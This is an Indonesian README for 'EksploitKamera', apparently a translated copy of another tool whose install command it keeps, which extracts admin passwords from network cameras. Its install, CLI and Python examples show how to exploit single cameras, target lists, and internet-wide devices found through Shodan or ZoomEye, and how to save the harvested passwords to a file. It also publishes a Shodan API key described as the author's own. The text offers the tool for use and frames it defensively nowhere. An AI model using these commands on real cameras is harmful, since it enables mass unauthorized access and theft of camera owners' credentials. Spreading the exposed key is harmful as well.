## EksploitKamera

<p align="center">
  <img src="https://github.com/Yoga913/EksploitKamera/blob/main/gambar.jpg" alt="Deskripsi Gambar" width="300">
</p>

EksploitKamera adalah alat eksploitasi kamera yang memungkinkan pengungkapan kata sandi admin kamera jaringan.

## Fitur

* Mengeksploitasi kerentanan pada sebagian besar model kamera populer seperti `CCTV`, `GoAhead`, dan `Netwave`.
* Dioptimalkan untuk mengeksploitasi beberapa kamera sekaligus dari daftar dengan threading diaktifkan.
* Penggunaan CLI dan API yang sederhana.

## Instalasi

```shell
pip3 install git+https://github.com/EntySec/CamOver
```

## Penggunaan dasar

Untuk menggunakan EksploitKamera, ketik saja `eksploitkamera` di terminal Anda.

```
penggunaan: eksploitkamera [-h] [-t] [-o OUTPUT] [-i INPUT] [-a ADDRESS] [--shodan SHODAN]

[--zoomeye ZOOMEYE] [-p PAGES]

eksploitkamera adalah alat eksploitasi kamera yang memungkinkan pengungkapan kata sandi admin kamera jaringan.

argumen opsional:
-h, --help tampilkan pesan bantuan ini dan keluar
-t, --threads Gunakan thread untuk pekerjaan tercepat.
-o OUTPUT, --output OUTPUT
Hasil Untuk file.
-i INPUT, --input INPUT
File alamat.
-a ADDRESS, --address ADDRESS
Satu alamat. --shodan SHODAN Kunci API Shodan untuk mengeksploitasi perangkat melalui Internet.
--zoomeye ZOOMEYE Kunci API ZoomEye untuk mengeksploitasi perangkat melalui Internet.
-p PAGES, --pages PAGES
Jumlah halaman yang ingin Anda dapatkan dari ZoomEye.
```

### Contoh 

**Mengeksploitasi satu kamera**

```shell
eksploitkamera -a 192.168.99.100
```

**Mengeksploitasi kamera dari Internet**

Menggunakan mesin pencari Shodan untuk mengeksploitasi kamera melalui Internet, Menggunakannya dengan `-t` untuk eksploitasi cepat.

```shell
eksploitkamera -t --shodan PSKINdQe1GyxGgecYz2191H2JoS9qvgD
```

**CATATAN:** ​​Mengingat kunci API Shodan (`PSKINdQe1GyxGgecYz2191H2JoS9qvgD`) adalah kunci API PRO saya, Anda dapat menggunakan kunci ini atau kunci Anda sendiri,
bebas menggunakan semua sumber daya kami secara gratis :)

**Mengeksploitasi kamera dari file input**

Menggunakan basis data kamera yang dibuka dengan `-t` untuk eksploitasi cepat.

```shell
eksploitkamera -t -i camera.txt -o passwords.txt
```

**CATATAN:** ​​Ini akan mengeksploitasi semua kamera dalam daftar `cameras.txt` berdasarkan alamatnya dan menyimpan semua kata sandi yang diperoleh
ke `passwords.txt`.

## Penggunaan API

EksploitKamera juga memiliki API Python mereka sendiri yang dapat dipanggil dengan mengimpor EksploitKamera ke kode Anda.

```python
from eksploitkamera import EksploitKamera
```

### Fungsi dasar

Ada semua fungsi dasar EksploitKamera yang dapat digunakan untuk mengeksploitasi kamera tertentu.

* `exploit(address)` - Mengeksploitasi satu kamera dengan alamat yang diberikan.

### Contoh

**Mengeksploitasi satu kamera**

```python
from eksploitkamera import EksploitKamera

eksploitkamera = EksploitKamera()
creds = eksploitkamera.exploit('192.168.99.100')

print(creds)
```
